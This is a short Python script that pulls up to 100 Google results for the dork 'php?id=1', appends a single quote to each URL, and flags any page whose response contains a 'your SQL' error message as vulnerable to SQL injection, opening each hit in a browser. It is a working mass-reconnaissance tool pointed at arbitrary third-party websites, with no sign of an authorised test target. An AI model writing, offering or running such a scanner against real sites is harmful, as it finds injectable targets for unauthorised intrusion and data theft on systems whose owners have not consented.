import requests
from googlesearch import search
import webbrowser

kay = "php?id=1"
kay1 = "'"

for i in search(kay, stop=100):
    try:
        req = requests.get(i+kay1)
        msg = "your SQL"
        if msg in req.text:
            print("SQL FOUND")
            print(i)
            webbrowser.open(i)
            xx = input("Do you compliet y/n: ")
            if xx == "y" or xx == "Y":
                break
        else:
            print("SQL NO FOUND")
    except:
        print("INTERNET!!!!!")
